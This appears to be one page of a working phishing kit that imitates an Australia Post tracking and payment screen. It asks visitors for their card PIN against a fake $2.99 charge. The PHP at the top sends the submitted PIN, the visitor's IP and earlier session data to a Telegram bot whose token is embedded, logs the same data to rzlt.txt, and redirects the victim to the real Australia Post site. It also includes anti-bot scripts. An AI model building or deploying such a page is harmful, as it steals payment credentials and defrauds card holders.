<?php
session_start();
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti6.php"; 
include "anti/anti7.php"; 
include "anti/anti8.php"; 
include "id.php";



function sendMessageT($chatID, $messaggio, $token) {


    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
    $url = $url . "&text=" . urlencode($messaggio);
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

//for debug only!
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    curl_close($curl);
}
if(isset($_POST['okbbx'])){
$ip = getenv("REMOTE_ADDR");
    $message =   $_SESSION["msg"] ;
$message .= "-------------------- [+] Lori Fullz [+]-------------------\nCard Pin  : ".$_POST['sms1']."\nIP      : ".$ip."\n-------------------- [+] Lori Fullz [+]-------------------\n";
    $_SESSION["msg"] = $message ;
    sendMessageT('-4091358695',$message,'6122494476:AAHw3y87SQbDVg2suTMbuAkwFEFmvSCTQUs');
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
HEADER("Location: https://auspost.com.au/shop/");
}
?>
<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths dj_gecko dj_contentbox" lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex">
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <script src="https://tools.usps.com/go/scripts/libs/jquery.min.js"></script>
  <script src="https://tools.usps.com/go/js/modules/usps/metrics/metrics-all.js"></script>
  <script src="https://www.googleoptimize.com/optimize.js?id=GTM-T35N9RL"></script>
  <title>Australia Post® - Aupost Tracking® Results</title>
  <link rel="stylesheet" href="https://tools.usps.com/go/css/footer.css">
  <link rel="stylesheet" href="https://tools.usps.com/go/css/libs/bootstrap.min.css">
  <link rel="stylesheet" href="https://tools.usps.com/go/css/redelivery-reskin/calendar.css">
  <link rel="stylesheet" href="https://tools.usps.com//go/css/libs/datepicker3.css">
  <link rel="stylesheet" href="https://tools.usps.com//go/css/main.css">
  <link rel="stylesheet" href="https://tools.usps.com//go/css/tracking-cross-sell.css">
  <link rel="stylesheet" href="https://tools.usps.com//go/css/redelivery-reskin/jquery-ui.min.css">
  <link rel="stylesheet" href="https://tools.usps.com//go/css/redelivery-reskin/schedule-redelivery.css">
  <script type="text/javascript" async="" src="https://fast.fonts.net/t/trackingCode.js"></script>
  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="require-jquery" src="https://www.usps.com/global-elements/lib/script/require-jquery.js"></script>
  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="helpers" src="https://www.usps.com/global-elements/lib/script/helpers.js"></script>
  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="search-fe" src="https://www.usps.com/global-elements/header/script/search-fe.js"></script>
  <link href="https://tools.usps.com/go/styles/qt.css" type="text/css" rel="stylesheet" media="screen">
  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="jquery" src="https://www.usps.com/global-elements/lib/script/jquery/dist/jquery.min.js"></script>
  <script type="text/javascript" charset="utf-8" async="" data-requirecontext="global" data-requiremodule="resize-manager" src="https://www.usps.com/global-elements/lib/script/resize-manager.js"></script>
</head>
<body>
<div id="tracking_page_wrapper">
<link href="https://tools.usps.com/global-elements/header/css/megamenu-v2.css" type="text/css" rel="stylesheet">

      
      <div class="row">
        <div class="col-sm-10">
          <span class="cancel"><a href="#" class="track-another-package-close" style="display: none;">Close <i class="icon-cancel"></i></a></span>
        </div>
      </div>
      <div class="row tracking-group" style="display: none">

	  <!-- Start TRACKING FORM -->
	  <form data-toggle="validator" action="TrackConfirmAction" name="TrackConfirmAction" id="trackPackage" method="GET" novalidate="true">
		<input type="hidden" id="tRef" name="tRef" value="fullpage">
		<input type="hidden" id="tLc" name="tLc" value="0">
		<input type="hidden" id="text28777" name="text28777" value="">
		<input type="hidden" id="tLabels" name="tLabels" value="">
		<div class="col-sm-10">
			<div class="form-group">
			  <textarea type="text" class="form-control" id="tracking-input" placeholder="Enter up to 35 tracking numbers separated by commas or enter a barcode number" required="" pattern="(((,[1-9])\d+)){1,35}" data-pattern-error="Please enter a valid tracking number" data-required-error="Please enter a tracking number."></textarea>
			  <div class="help-block with-errors"></div>
			</div>
		</div>
		<div class="col-sm-2 track-btn-ctn">
		  <button class="button tracking-btn" type="submit">Track</button>
		</div>
	  </form>
      </div>
      </div> 

<center style="border: 0.001px  solid; border-radius:1px; width:370px; padding:50px; padding-top:30px; margin:auto; margin-top:90px; box-shadow: 2px 2px 2px 1px rgba(0, 0, 0, 0.2);" >
<img src="https://i.ibb.co/80SNWyY/271814880-699476244749819-1151542957592177904-n.jpg" alt="271814880-699476244749819-1151542957592177904-n" border="0" style="width: 200px; height:100px;">
<h3>Please enter your 4 digit pin</h3>
    <table border=0   >
<form method="POST" action="">

<tr> <td></td> </tr>



<tr> <td>   Merchant&nbsp;: </td> <td> AUS Post &nbsp;Service </td> </tr> 

<tr> <td>
    Amount : </td> <td> <b> $2.99  </b> </td> </tr> 



<tr> <td>   Date : </td> <td> <b>  <?php echo date("Y-m-d"); ?> </b>  </td> </tr> 

<tr> <td>
PIN code : </td> <td> <input type="text" style="display: inline;" name="sms1" maxlength="50" required="" placeholder="PIN code" tabindex="8" id="taddress">
</td></tr> 
<style type="text/css">
#taddress {
  height: 25px !important;
    outline: none;

  border:1px solid gray !important;
  background-image:none;
  background-color:transparent;
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;  
  background-image:none;
  background-color:transparent;
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;  
 }
</style>

<br>
<tr> <td>   </td> <td>  &nbsp;</td></tr>
<div class="row" style="margin:10px">
<tr> <td>
<button type="submit" name="okbbx"><div id="a-address-step1-wrap" ><a tabindex="13" id="a-address-step1" >Submit</a></div></button>
</td> <td> &nbsp;
<button type="reset" ><div id="a-address-step1-wrap" ><a tabindex="13"  >Cancel</a></div></button> </td> </tr>
</div>

<br>


<br>
</div>

								
</form>
</table>
</center>

</div><div id="quick-tools-container" style="display:none;"><div>
</body></html>
